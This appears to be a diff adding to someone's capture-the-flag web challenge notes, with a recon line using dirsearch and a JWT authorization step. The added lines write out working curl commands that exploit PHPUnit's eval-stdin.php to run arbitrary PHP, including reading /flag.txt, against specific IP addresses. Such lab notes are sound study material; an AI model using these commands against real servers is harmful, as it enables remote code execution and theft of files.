@@ -29,6 +29,12 @@
 
 12 authorization  dirsearch -u IP                     curl -X POST http://34.159.62.179:30798/auth             (aplikacia) ModHeader: Authorization        JWT   <TOKEM>
 
+13 PHPunit  http://35.246.139.54:31380/composer.json    curl -X POST --data '<?php system("id"); ?>' http://35.246.139.54:31380/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+
+
+curl -X POST --data '<?php system("cat /flag.txt"); ?>' http://35.246.139.54:31380/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+
+14
 
 
 https://jorgectf.github.io/blog/post/cyberedu-web-challenges/#rundown 
